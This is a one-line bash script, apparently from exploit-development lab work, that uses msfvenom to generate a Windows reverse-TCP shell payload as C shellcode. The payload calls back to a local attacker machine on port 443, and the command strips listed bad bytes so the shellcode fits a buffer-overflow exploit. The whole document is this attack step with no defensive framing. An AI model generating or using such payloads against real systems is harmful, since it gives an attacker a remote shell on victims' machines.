#!/bin/bash

# A generic reverse shell, exiting off a thread on local Kali machine on port 443 formatting into C with bad bytes
msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.1.24 LPORT=443 -f c -b '\x00\x20\x25\x2b\x2f\x5c'
